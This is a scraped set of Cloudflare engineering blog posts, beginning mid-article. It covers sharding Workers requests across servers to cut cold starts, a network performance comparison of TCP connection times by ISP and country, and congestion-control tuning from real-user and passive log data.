limits since our last Eliminating Cold Starts blog post:Worker script size (compressed) increased from 1 MB to 5 MB, then again from 5 MB to 10 MB, for paying users.Worker script size (compressed) increased from 1 MB to 3 MB for free users.Startup CPU time increased from 200ms to 400ms.We relaxed these limits because our users wanted to deploy increasingly complex applications to our platform. And deploy they did! But the increases have a cost:Increasing script size increases the amount of data we must transfer from script storage to the Workers runtime.Increasing script size also increases the time complexity of the script compilation phase.Increasing the startup CPU time limit increases the maximum top-level execution time.Taken together, cold starts for complex applications began to lose the TLS handshake race. Routing requests to an existing Worker With relaxed script size and startup time limits, optimizing cold start time directly was a losing battle. Instead, we needed to figure out how to reduce the absolute number of cold starts, so that requests are simply less likely to incur one.One option is to route requests to existing Worker instances, where before we might have chosen to start a new instance.Previously, we weren’t particularly good at routing requests to existing Worker instances. We could trivially coalesce requests to a single Worker instance if they happened to land on a machine which already hosted a Worker, because in that case it’s not a distributed systems problem. But what if a Worker already existed in our data center on a different server, and some other server received a request for the Worker? We would always choose to cold start a new Worker on the machine which received the request, rather than forward the request to the machine with the already-existing Worker, even though forwarding the request would avoid the cold start. To drive the point home: Imagine a visitor sends one request per minute to a data center with 300 servers, and that the traffic is load balanced evenly across all servers. On average, each server will receive one request every five hours. In particularly busy data centers, this span of time could be long enough that we need to evict the Worker to re-use its resources, resulting in a 100% cold start rate. That’s a terrible experience for the visitor.Consequently, we found ourselves explaining to users, who saw high latency while prototyping their applications, that their latency would counterintuitively decrease once they put sufficient traffic on our network. This highlighted the inefficiency in our original, simple design.If, instead, those requests were all coalesced onto one single server, we would notice multiple benefits. The Worker would receive one request per minute, which is short enough to virtually guarantee that it won’t be evicted. This would mean the visitor may experience a single cold start, and then have a 100% “warm request rate.” We would also use 99.7% (299 / 300) less memory serving this traffic. This makes room for other Workers, decreasing their eviction rate, and increasing their warm request rates, too – a virtuous cycle!There’s a cost to coalescing requests to a single instance, though, right? After all, we’re adding latency to requests if we have to proxy them around the data center to a different server.In practice, the added time-to-first-byte is less than one millisecond, and is the subject of continual optimization by our IPC and performance teams. One millisecond is far less than a typical cold start, meaning it’s always better, in every measurable way, to proxy a request to a warm Worker than it is to cold start a new one. The consistent hash ring A solution to this very problem lies at the heart of many of our products, including one of our oldest: the HTTP cache in our Content Delivery Network.When a visitor requests a cacheable web asset through Cloudflare, the request gets routed through a pipeline of proxies. One of those proxies is a caching proxy, which stores the asset for later, so we can serve it to future requests without having to request it from the origin again.A Worker cold start is analogous to an HTTP cache miss, in that a request to a warm Worker is like an HTTP cache hit.When our standard HTTP proxy pipeline routes requests to the caching layer, it chooses a cache server based on the request's cache key to optimize the HTTP cache hit rate. The cache key is the request’s URL, plus some other details. This technique is often called “sharding”. The servers are considered to be individual shards of a larger, logical system – in this case a data center’s HTTP cache. So, we can say things like, “Each data center contains one logical HTTP cache, and that cache is sharded across every server in the data center.”Until recently, we could not make the same claim about the set of Workers in a data center. Instead, each server contained its own standalone set of Workers, and they could easily duplicate effort.We borrow the cache’s trick to solve that. In fact, we even use the same type of data structure used by our HTTP cache to choose servers: a consistent hash ring. A naive sharding implementation might use a classic hash table mapping Worker script IDs to server addresses. That would work fine for a set of servers which never changes. But servers are actually ephemeral and have their own lifecycle. They can crash, get rebooted, taken out for maintenance, or decommissioned. New ones can come online. When these events occur, the size of the hash table would change, necessitating a re-hashing of the whole table. Every Worker’s home server would change, and all sharded Workers would be cold started again!A consistent hash ring improves this scenario significantly. Instead of establishing a direct correspondence between script IDs and server addresses, we map them both to a number line whose end wraps around to its beginning, also known as a ring. To look up the home server of a Worker, first we hash its script, and then we find where it lies on the ring. Next, we take the server address which comes directly on or after that position on the ring, and consider that the Worker’s home. If a new server appears for some reason, all the Workers that lie before it on the ring get re-homed, but none of the other Workers are disturbed. Similarly, if a server disappears, all the Workers which lay before it on the ring get re-homed. We refer to the Worker’s home server as the “shard server”. In request flows involving sharding, there is also a “shard client”. It’s also a server! The shard client initially receives a request, and, using its consistent hash ring, looks up which shard server it should send the request to. I’ll be using these two terms – shard client and shard server – in the rest of this post. Handling overload The nature of HTTP assets lend themselves well to sharding. If they are cacheable, they are static, at least for their cache Time to Live (TTL) duration. So, serving them requires time and space complexity which scales linearly with their size.But Workers aren’t JPEGs. They are live units of compute which can use up to five minutes of CPU time per request. Their time and space complexity do not necessarily scale with their input size, and can vastly outstrip the amount of computing power we must dedicate to serving even a huge file from cache.This means that individual Workers can easily get overloaded when given sufficient traffic. So, no matter what we do, we need to keep in mind that we must be able to scale back up to infinity. We will never be able to guarantee that a data center has only one instance of a Worker, and we must always be able to horizontally scale at the drop of a hat to support burst traffic. Ideally this is all done without producing any errors.This means that a shard server must have the ability to refuse requests to invoke Workers on it, and shard clients must always gracefully handle this scenario. Two load shedding options I am aware of two general solutions to shedding load gracefully, without serving errors.In the first solution, the client asks politely if it may issue the request. It then sends the request if it receives a positive response. If it instead receives a “go away” response, it handles the request differently, like serving it locally. In HTTP, this pattern can be found in Expect: 100-continue semantics. The main downside is that this introduces one round-trip of latency to set the expectation of success before the request can be sent. (Note that a common naive solution is to just retry requests. This works for some kinds of requests, but is not a general solution, as requests may carry arbitrarily large bodies.) The second general solution is to send the request without confirming that it can be handled by the server, then count on the server to forward the request elsewhere if it needs to. This could even be back to the client. This avoids the round-trip of latency that the first solution incurs, but there is a tradeoff: It puts the shard server in the request path, pumping bytes back to the client. Fortunately, we have a trick to minimize the amount of bytes we actually have to send back in this fashion, which I’ll describe in the next section. Optimistically sending sharded requests There are a couple of reasons why we chose to optimistically send sharded requests without waiting for permission.The first reason of note is that we expect to see very few of these refused requests in practice. The reason is simple: If a shard client receives a refusal for a Worker, then it must cold start the Worker locally. As a consequence, it can serve all future requests locally without incurring another cold start. So, after a single refusal, the shard client won’t shard that Worker any more (until traffic for the Worker tapers off enough for an eviction, at least).Generally, this means we expect that if a request gets sharded to a different server, the shard server will most likely accept the request for invocation. Since we expect success, it makes a lot more sense to optimistically send the entire request to the shard server than it does to incur a round-trip penalty to establish permission first.The second reason is that we have a trick to avoid paying too high a cost for proxying the request back to the client, as I mentioned above.We implement our cross-instance communication in the Workers runtime using Cap’n Proto RPC, whose distributed object model enables some incredible features, like JavaScript-native RPC. It is also the elder, spiritual sibling to the just-released Cap’n Web.In the case of sharding, Cap’n Proto makes it very easy to implement an optimal request refusal mechanism. When the shard client assembles the sharded request, it includes a handle (called a capability in Cap’n Proto) to a lazily-loaded local instance of the Worker. This lazily-loaded instance has the same exact interface as any other Worker exposed over RPC. The difference is just that it’s lazy – it doesn’t get cold started until invoked. In the event the shard server decides it must refuse the request, it does not return a “go away” response, but instead returns the shard client’s own lazy capability!The shard client’s application code only sees that it received a capability from the shard server. It doesn’t know where that capability is actually implemented. But the shard client’s RPC system does know where the capability lives! Specifically, it recognizes that the returned capability is actually a local capability – the same one that it passed to the shard server. Once it realizes this, it also realizes that any request bytes it continues to send to the shard server will just come looping back. So, it stops sending more request bytes, waits to receive back from the shard server all the bytes it already sent, and shortens the request path as soon as possible. This takes the shard server entirely out of the loop, preventing a “trombone effect.” Workers invoking Workers With load shedding behavior figured out, we thought the hard part was over.But, of course, Workers may invoke other Workers. There are many ways this could occur, most obviously via Service Bindings. Less obviously, many of our favorite features, such as Workers KV, are actually cross-Worker invocations. But there is one product, in particular, that stands out for its powerful ability to invoke other Workers: Workers for Platforms.Workers for Platforms allows you to run your own functions-as-a-service on Cloudflare infrastructure. To use the product, you deploy three special types of Workers:a dynamic dispatch Workerany number of user Workersan optional, parameterized outbound WorkerA typical request flow for Workers for Platforms goes like so: First, we invoke the dynamic dispatch Worker. The dynamic dispatch Worker chooses and invokes a user Worker. Then, the user Worker invokes the outbound Worker to intercept its subrequests. The dynamic dispatch Worker chose the outbound Worker's arguments prior to invoking the user Worker.To really amp up the fun, the dynamic dispatch Worker could have a tail Worker attached to it. This tail Worker would need to be invoked with traces related to all the preceding invocations. Importantly, it should be invoked one single time with all events related to the request flow, not invoked multiple times for different fragments of the request flow.You might further ask, can you nest Workers for Platforms? I don’t know the official answer, but I can tell you that the code paths do exist, and they do get exercised.To support this nesting doll of Workers, we keep a context stack during invocations. This context includes things like ownership overrides, resource limit overrides, trust levels, tail Worker configurations, outbound Worker configurations, feature flags, and so on. This context stack was manageable-ish when everything was executed on a single thread. For sharding to be truly useful, though, we needed to be able to move this context stack around to other machines.Our choice of Cap’n Proto RPC as our primary communications medium helped us make sense of it all. To shard Workers deep within a stack of invocations, we serialize the context stack into a Cap’n Proto data structure and send it to the shard server. The shard server deserializes it into native objects, and continues the execution where things left off.As with load shedding, Cap’n Proto’s distributed object model provides us simple answers to otherwise difficult questions. Take the tail Worker question – how do we coalesce tracing data from invocations which got fanned out across any number of other servers back to one single place? Easy: create a capability (a live Cap’n Proto object) for a reportTraces() callback on the dynamic dispatch Worker’s home server, and put that in the serialized context stack. Now, that context stack can be passed around at will. That context stack will end up in multiple places: At a minimum, it will end up on the user Worker’s shard server and the outbound Worker’s shard server. It may also find its way to other shard servers if any of those Workers invoked service bindings! Each of those shard servers can call the reportTraces() callback, and be confident that the data will make its way back to the right place: the dynamic dispatch Worker’s home server. None of those shard servers need to actually know where that home server is. Phew! Eviction rates down, warm request rates up Features like this are always satisfying to roll out, because they produce graphs showing huge efficiency gains.Once fully rolled out, only about 4% of total requests from enterprise traffic ended up being sharded. To put that another way, 96% of all enterprise requests are to Workers which are sufficiently loaded that we must run multiple instances of them in a data center. Despite that low total rate of sharding, we reduced our global Worker eviction rate by 10x. Our eviction rate is a measure of memory pressure within our system. You can think of it like garbage collection at a macro level, and it has the same implications. Fewer evictions means our system uses memory more efficiently. This has the happy consequence of using less CPU to clean up our memory. More relevant to Workers users, the increased efficiency means we can keep Workers in memory for an order of magnitude longer, improving their warm request rate and reducing their latency.The high leverage shown – sharding just 4% of our traffic to improve memory efficiency by 10x – is a consequence of the power-law distribution of Internet traffic.A power law distribution is a phenomenon which occurs across many fields of science, including linguistics, sociology, physics, and, of course, computer science. Events which follow power law distributions typically see a huge amount clustered in some small number of “buckets”, and the rest spread out across a large number of those “buckets”. Word frequency is a classic example: A small handful of words like “the”, “and”, and “it” occur in texts with extremely high frequency, while other words like “eviction” or “trombone” might occur only once or twice in a text.In our case, the majority of Workers requests goes to a small handful of high-traffic Workers, while a very long tail goes to a huge number of low-traffic Workers. The 4% of requests which were sharded are all to low-traffic Workers, which are the ones that benefit the most from sharding.So did we eliminate cold starts? Or will there be an Eliminating Cold Starts 3 in our future? For enterprise traffic, our warm request rate increased from 99.9% to 99.99% – that’s three 9’s to four 9’s. Conversely, this means that the cold start rate went from 0.1% to 0.01% of requests, a 10x decrease. A moment’s thought, and you’ll realize that this is coherent with the eviction rate graph I shared above: A 10x decrease in the number of Workers we destroy over time must imply we’re creating 10x fewer to begin with.Simultaneously, our warm request rate became less volatile throughout the course of the day.Hmm.I hate to admit this to you, but I still notice a little bit of space at the top of the graph. 😟Can you help us get to five 9’s?Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Birthday WeekCap'n ProtoCloudflare WorkersEngineeringTLS\nOctober 14, 2025 8:00 PMUnpacking Cloudflare Workers CPU Performance BenchmarksCloudflare investigated CPU performance benchmark results for Workers, uncovering and fixing issues in infrastructure, V8 garbage collection, and OpenNext optimizations. ...By Kenton VardaCloudflare Workers, Developer Platform, Developers\nSeptember 30, 2025 3:50 PMPayload on Workers: a full-fledged CMS, running entirely on Cloudflare’s stackWe demonstrate how the open-source Payload CMS was ported to run entirely on Cloudflare's developer platform....By Jason Kincaid, Ricardo TavaresCloudflare Workers\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar", "timestamp": "2025-10-21T13:33:42.226927"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Network performance update: Birthday Week 2025", "url": "https://blog.cloudflare.com/network-performance-update-birthday-week-2025/", "published": "Fri, 26 Sep 2025 13:00:00 GMT", "content": "Network performance update: Birthday Week 20252025-09-26Lai Yi Ohlsen9 min readWe are committed to being the fastest network in the world because improvements in our performance translate to improvements for the own end users of your application. We are excited to share that Cloudflare continues to be the fastest network for the most peered networks in the world.We relentlessly measure our own performance and our performance against peers. We publish those results routinely, starting with our first update in June 2021 and most recently with our last post in September 2024.Today’s update breaks down where we have improved since our update last year and what our priorities are going into the next year. While we are excited to be the fastest in the greatest number of last-mile ISPs, we are never done improving and have more work to do. How do we measure this metric, and what are the results? We measure network performance by attempting to capture what the experience is like for Internet users across the globe. To do that we need to simulate what their connection is like from their last-mile ISP to our networks.We start by taking the 1,000 largest networks in the world based on estimated population. We use that to give ourselves a representation of real users in nearly every geography.We then measure performance itself with TCP connection time. TCP connection time is the time it takes for an end user to connect to the website or endpoint they are trying to reach. We chose this metric because we believe this most closely approximates what users perceive to be Internet speed, as opposed to other metrics which are either too scientific (ignoring real world challenges like congestion or distance) or too broad.We take the trimean measurement of TCP connection times to calculate our metric. The trimean is a weighted average of three statistical values: the first quartile, the median, and the third quartile. This approach allows us to reduce some of the noise and outliers and get a comprehensive picture of quality.For this year’s update, we examined the trimean of TCP connection times measured from August 6 to September 4, Cloudflare is the #1 provider in 40% of the top 1000 networks. In our September 2024 update, we shared that we were the #1 provider in 44% of the top 1000 networks. The TCP Connection Time (Trimean) graph shows that we are the fastest TCP connection time in 383 networks, but that would make us the fastest in 38% of the top 1,000. We exclude networks that aren’t last-mile ISPs, such as transit networks, since they don’t reflect the end user experience, which brings the number of measured networks to 964 and makes Cloudflare the fastest in 40% of measured ISPs and the fastest across the top networks. How do we capture this data? A Cloudflare-branded error page does more than just display an error; it kicks off a real-world speed test. Behind the scenes, on a selection of our error pages, we use Real User Measurements (RUM), which involves a browser retrieving a small file from multiple networks, including Cloudflare, Amazon CloudFront, Google, Fastly and Akamai.Running these tests lets us gather performance data directly from the user's perspective, providing a genuine comparison of different network speeds. We do this to understand where our network is fastest and, more importantly, where we can make further improvements. For a deeper dive into the technical details, the Speed Week blog post covers the full methodology.By using RUM data, we track key metrics like TCP Connection Time, Time to First Byte (TTFB), and Time to Last Byte (TTLB). These are widely recognized, industry-standard metrics that allow us to objectively measure how quickly and efficiently a website loads for actual users. By monitoring these benchmarks, we can objectively compare our performance against other networks.We specifically chose the top 1000 networks by estimated population from APNIC, excluding those that aren’t last-mile ISPs. Consistency is key: by analyzing the same group of networks in every cycle, we ensure our measurements and reporting remain reliable and directly comparable over time. How do the results compare across countries? The map below shows the fastest providers per country and Cloudflare is fastest in dozens of countries. The color coding is generated by grouping all the measurements we generate by which country the measurement originates from. Then we look at the trimean measurements for each provider to identify who is the fastest… Akamai was measured as well, but providers are only represented in the map if they ranked first in a country which Akamai does not anywhere in the world.These slim margins mean that the fastest provider in a country is often determined by latency differences so small that the fastest provider is often only faster by less than 5%. As an example, let’s look at India, a country where we are currently the second-fastest provider.India (IN)RankEntity Connect Time (Trimean)#1 Diff#1CloudFront107 ms-#2Cloudflare113 ms+4.81% (+5.16 ms)#3Google117 ms+8.74% (+9.39 ms)#4 Fastly133 ms+24% (+26 ms)#5Akamai144 ms+34% (+37 ms)In India, Cloudflare is 5ms behind Cloudfront, the #1 provider (To put milliseconds into perspective, the average human eye blink lasts between 100ms and 400ms). The competition for the number one spot in many countries is fierce and often shifts day by day. For example, in Mexico on Tuesday, August 5th, Cloudflare was the second-fastest provider by 0.73 ms but then on Tuesday, August 12th, Cloudflare was the fastest provider by 3.72 ms. Mexico (MX)DateRankEntity Connect Time (Trimean)#1 DiffAugust 5, 2025#1CloudFront116 ms-#2Cloudflare116 ms+0.63% (+0.73 ms)August 12, 2025#1Cloudflare106 ms-#2CloudFront109 ms+3.52% (+3.72 ms)Because ranking reorderings are common, we also review country and network level rankings to evaluate and benchmark our performance. Focusing on where we are not the fastest yet As mentioned above, in September 2024, Cloudflare was fastest in 44% of measured ISPs. These values can shift as providers constantly make improvements to their networks. One way we focus in on how we are prioritizing improving is to not just observe where we are not the fastest but to measure how far we are from the leader.In these locations we tend to pace extremely close to the fastest provider, giving us an opportunity to capture the spot as we relentlessly improve. In networks where Cloudflare is 2nd, over 50% of those networks have a less than 5% difference (10ms or less) with the top provider.CountryASN#1Cloudflare Rank#1 Diff (ms)#1 Diff (%)USAS36352Google225 ms32%USAS46475Google235 ms29%USAS29802Google28.03 ms21%USAS20473Google215 ms13%USAS7018CloudFront223 ms13%USAS4181CloudFront28.19 ms11%USAS62240Google218 ms9.77%USAS22773CloudFront212 ms9.48%USAS6167CloudFront213 ms7.55%USAS11427Google29.33 ms5.27%USAS6614CloudFront26.68 ms4.12%USAS4922Google23.38 ms3.86%USAS11492Fastly23.73 ms3.33%USAS11351Google25.14 ms3.04%USAS396356Google24.12 ms2.23%USAS212238Google23.42 ms1.35%USAS20055Fastly21.22 ms1.33%USAS40021CloudFront22.06 ms0.91%USAS12271Fastly21.26 ms0.89%USAS141039CloudFront21.26 ms0.88%In networks where Cloudflare is 3rd, 50% of those networks are less than a 10% difference with the top provider (10ms or less). Margins are small and suggest that in instances where Cloudflare isn’t number one across networks, we’re extremely close to our competitors and the top networks change day over day. CountryASN#1Cloudflare Rank#1 Diff (ms)#1 Diff (%)USAS6461Google333 ms39%USAS81Fastly343 ms35%USAS14615Google324 ms24%USAS13977CloudFront321 ms19%USAS33363Google329 ms18%USAS63949Google39.56 ms14%USAS14593Fastly317 ms13%USAS23089CloudFront37.4 ms11%USAS16509Fastly310 ms9.48%USAS209CloudFront39.69 ms6.87%USAS27364CloudFront38.76 ms6.61%USAS11404CloudFront36.11 ms6.16%USAS46690CloudFront35.91 ms5.43%USAS136787CloudFront38.23 ms5.18%USAS6079Fastly35.45 ms4.49%USAS5650Google33.91 ms3.35%Countries with an abundance of networks, like the United States, have a lot of noise we need to calibrate against. For example, the graph below represents the performance of all providers for a major ISP like AS701 (Verizon Business).AS701 (Verizon Business) Connect Time (P95) between 2025-08-09 and 2025-09-09 In this chart, the “P95” value, or 95th percentile, refers to one point of a percentile distribution. The P95 shows the value below which 95% of the data points fall and is specifically good at helping identify the slowest or worst-case user experiences, such as those on poor networks or older devices. Additionally, we review the other numbers lower on the percentile chain in the table below, which tell us how performance varies across the full range of data. When we do so, the picture becomes more nuanced.AS701 (Verizon Business) Provider Rankings for Connect Time at P95, P75 and P50RankEntity Connect Time (P95)Connect Time (P75)Connect Time (P50)#1Fastly128 ms66 ms48 ms#2Google134 ms72 ms54 ms#3CloudFront139 ms67 ms47 ms#4 Cloudflare141 ms68 ms49 ms#5Akamai160 ms84 ms61 msAt the 95th percentile for AS701, Cloudflare ranks 4th but at the 75th and 50th, Cloudflare is only 2 milliseconds slower than the fastest provider. In other words, when reviewing more than one point along the distribution at the network level, Cloudflare is keeping up with the top providers for the less extreme samples. To capture these details, it’s important to look at the range of outcomes, not just one percentile.To better reflect the full spectrum of user experiences, we started using the trimean in July 2025 to rank providers. This metric combines values from across the distribution of data - specifically the 75th, 50th and 25th percentiles - which gives a more balanced representation of overall performance, rather than only focusing on the extremes. Summarizing user experience with a single number is always challenging, but the trimean helps us compare providers in a way that better reflects how users actually experience the Internet.Cloudflare is the fastest provider in 40% of networks in the majority of real-world conditions, not just in worst-case scenarios. Still, the 95th percentile remains key to understanding how performance holds up in challenging conditions and where other providers might fall behind in performance. When we review the 95th percentile across the same date range for all the networks, not just AS701, Cloudflare is fastest across roughly the same amount of networks but by 103 more networks than the next fastest provider. Being faster in such a wide margin of networks tells us that Cloudflare is particularly strong in the challenging, long-tail cases that other providers struggle with. Our performance data shows that even when we are not the top-ranked provider, we remain exceptionally competitive, often trailing the leader by a mere handful of percentage points. Our strength at the 95th percentile also highlights our superior performance in the most challenging scenarios. Cloudflare’s ability to outperform other providers, in the worst-case, is a testament to the resilience and efficiency of our network.Moving forward, we'll continue to share multiple metrics and continue to make improvements to our network —and we’ll use this data to do it! Let’s talk about how. How does Cloudflare use this data to improve? Cloudflare applies this data to identify regions and networks that need prioritization. If we are consistently slower than other providers in a network, we want to know why, so we can fix it.For example, the graph below shows the 95th percentile of Connect Time for AS8966. Prior to June 13, 2025, our performance was suffering, and we were the slowest provider for the network. By referencing our own measurement data, we prioritized partner data centers in the region and almost immediately performance improved for users connecting through AS8966.Cloudflare’s partner data centers consist of collaborations with local service providers who host Cloudflare's equipment within their own facilities. This allows us to expand our network to new locations and get closer to users more quickly. In the case of AS8966, adding a new partner data center took us from being ranked last to ranked first and improved latency by roughly 150ms in one day. By using a data-driven approach, we made our network faster and most importantly, improved the end user experience.TCP Connect Time (P95) for AS8966 What’s next? We are always working to build a faster network and will continue sharing our process as we go. Our approach is straightforward: identify performance bottlenecks, implement fixes, and report the results. We believe in being transparent about our methods and are committed to a continuous cycle of improvement to achieve the best possible performance. Follow our blog for the latest performance updates as we continue to optimize our network and share our progress.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Birthday WeekNetwork Performance UpdatePerformanceNetwork Services\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar\nSeptember 26, 2025 2:00 PMAn AI Index for all our customersCloudflare will soon automatically create an AI-optimized search index for your domain, and expose a set of ready-to-use standard APIs and tools including an MCP server, LLMs.txt, and a search API....By Celso Martinho, Anni WangAI, Birthday Week, Pay Per Crawl, AI Search, MCP", "timestamp": "2025-10-21T13:33:43.054307"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "How Cloudflare uses the world’s greatest collection of performance data to make the world’s fastest global network even faster", "url": "https://blog.cloudflare.com/how-cloudflare-uses-the-worlds-greatest-collection-of-performance-data/", "published": "Fri, 26 Sep 2025 06:00:00 GMT", "content": "How Cloudflare uses the world’s greatest collection of performance data to make the world’s fastest global network even faster2025-09-26Steve GoldsmithRichard Boulton7 min readThis post is also available in 繁體中文, Deutsch, 日本語, 한국어, Español, Nederlands and Français.Cloudflare operates the fastest network on the planet. We’ve shared an update today about how we are overhauling the software technology that accelerates every server in our fleet, improving speed globally.That is not where the work stops, though. To improve speed even further, we have to also make sure that our network swiftly handles the Internet-scale congestion that hits it every day, routing traffic to our now-faster servers.We have invested in congestion control for years. Today, we are excited to share how we are applying a superpower of our network, our massive Free Plan user base, to optimize performance and find the best way to route traffic across our network for all our customers globally.Early results have seen performance increases that average 10% faster than the prior baseline. We achieved this by applying different algorithmic methods to improve performance based on the data we observe about the Internet each day. We are excited to begin rolling out these improvements to all customers. How does traffic arrive in our network? The Internet is a massive collection of interconnected networks, each composed of many machines (“nodes”). Data is transmitted by breaking it up into small packets, and passing them from one machine to another (over a “link”). Each one of these machines is linked to many others, and each link has limited capacity. When we send a packet over the Internet, it will travel in a series of “hops” over the links from A to B. At any given time, there will be one link (one “hop”) with the least available capacity for that path. It doesn’t matter where in the connection this hop is — it will be the bottleneck.But there’s a challenge — when you’re sending data over the Internet, you don’t know what route it’s going to take. In fact, each node decides for itself which route to send the traffic through, and different packets going from A to B can take entirely different routes. The dynamic and decentralized nature of the system is what makes the Internet so effective, but it also makes it very hard to work out how much data can be sent. So — how can a sender know where the bottleneck is, and how fast to send data?Between Cloudflare nodes, our Argo Smart Routing product takes advantage of our visibility into the global network to speed up communication. Similarly, when we initiate connections to customer origins, we can leverage Argo and other insights to optimize them. However, the speed of a connection from your phone or laptop (the Client below) to the nearest Cloudflare datacenter will depend on the capacity of the bottleneck hop in the chain from you to Cloudflare, which happens outside our network. What happens when too much data arrives at once? If too much data arrives at any one node in a network in the path of a request being processed, the requestor will experience delays due to congestion. The data will either be queued for a while (risking bufferbloat), or some of it will simply get dropped. Protocols like TCP and QUIC respond to packets being dropped by retransmitting the data, but this introduces a delay, and can even make the problem worse by further overloading the limited capacity.If cloud infrastructure providers like Cloudflare don’t manage congestion carefully, we risk overloading the system, slowing down the rate of data getting through. This actually happened in the early days of the Internet. To avoid this, the Internet infrastructure community has developed systems for controlling congestion, which give everyone a turn to send their data, without overloading the network. This is an evolving challenge, as the network grows ever more complicated, and the best method to implement congestion control is a constant pursuit. Many different algorithms have been developed, which take different sources of information and signals, optimize in a particular method, and respond to congestion in different ways.Congestion control algorithms use a number of signals to estimate the right rate to send traffic, without knowing how the network is set up. One important signal has been loss. When a packet is received, the receiver sends an “ACK,” telling the sender the packet got through. If it’s dropped somewhere along the way, the sender never gets the receipt, and after a timeout will treat the packet as having been lost.More recent algorithms have used additional data. For example, a popular algorithm called BBR (Bottleneck Bandwidth and Round-trip propagation time), which we have been using for much of our traffic, attempts to build a model during each connection of the maximum amount of data that can be transmitted in a given time period, using estimates of the round trip time as well as loss information.The best algorithm to use often depends on the workload. For example, for interactive traffic like a video call, an algorithm that biases towards sending too much traffic can cause queues to build up, leading to high latency and poor video experience. If one were to optimize solely for that use case though, and avoid that by sending less traffic, the network will not make the best use of the connection for clients doing bulk downloads. The performance optimization outcome varies, depending on a lot of different factors. But – we have visibility into many of them!BBR was an exciting development in congestion control approach, moving from reactive loss-based approaches to proactive model-based optimization, resulting in significantly better performance for modern networks. Our data gives us an opportunity to go further, applying different algorithmic methods to improve performance. How can we do better? All the existing algorithms are constrained to use only information gathered during the lifetime of the current connection. Thankfully, we know far more about the Internet at any given moment than this! With Cloudflare’s perspective on traffic, we see much more than any one customer or ISP might see at any given time.Every day, we see traffic from essentially every major network on the planet. When a request comes into our system, we know what client device we’re talking to, what type of network is enabling the connection, and whether we’re talking to consumer ISPs or cloud infrastructure providers.We know about the patterns of load across the global Internet, and the locations where we believe systems are overloaded, within our network, or externally. We know about the networks that have stable properties, which have high packet loss due to cellular data connections, and the ones that traverse low earth orbit satellite links and radically change their routes every 15 seconds. How does this work? We have been in the process of migrating our network technology stack to use a new platform, powered by Rust, that provides more flexibility to experiment with varying the parameters in the algorithms used to handle congestion control. Then we needed data.The data powering these experiments needs to reflect the measure we’re trying to optimize, which is the user experience. It’s not just enough that we’re sending data to nearly all the networks on the planet; we have to be able to see what is the experience that customers have. So how do we do that, at our scale?First, we have detailed “passive” logs of the rate at which data is able to be sent from our network, and how long it takes for the destination to acknowledge receipt. This covers all our traffic, and gives us an idea of how quickly the data was received by the client, but doesn’t guarantee to tell us about the user experience.Next, we have a system for gathering Real User Measurement (RUM) data, which records information in supported web browsers about metrics such as Page Load Time (PLT). Any Cloudflare customer can enable this and will receive detailed insights in their dashboard. In addition, we use this metadata in aggregate across all our customers and networks to understand what customers are really experiencing. However, RUM data is only going to be present for a small proportion of connections across our network. So, we’ve been working to find a way to predict the RUM measures by extrapolating from the data we see only in passive logs. For example, here are the results of an experiment we performed comparing two different algorithms against the cubic baseline. Now, here’s the same timescale, observed through the prediction based on our passive logs. The curves are very similar - but even more importantly, the ratio between the curves is very similar. This is huge! We can use a relatively small amount of RUM data to validate our findings, but optimize our network in a much more fine-grained way by using the full firehose of our passive logs. Extrapolating too far becomes unreliable, so we’re also working with some of our largest customers to improve our visibility of the behaviour of the network from their clients’ point of view, which allows us to extend this predictive model even further. In return, we’ll be able to give our customers insights into the true experience of their clients, in a way that no other platform can offer. What is next? We’re currently running our experiments and improved algorithms for congestion control on all of our free tier QUIC traffic. As we learn more, verify on more complex customers, and expand to TCP traffic, we’ll gradually roll this out to all our customers, for all traffic, over 2026 and beyond. The results have led to as much as a 10% improvement as compared to the baseline!We’re working with a select group of enterprises to test this in an early access program. If you’re interested in learning more, contact us! Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. SpeedBirthday WeekAISpeed 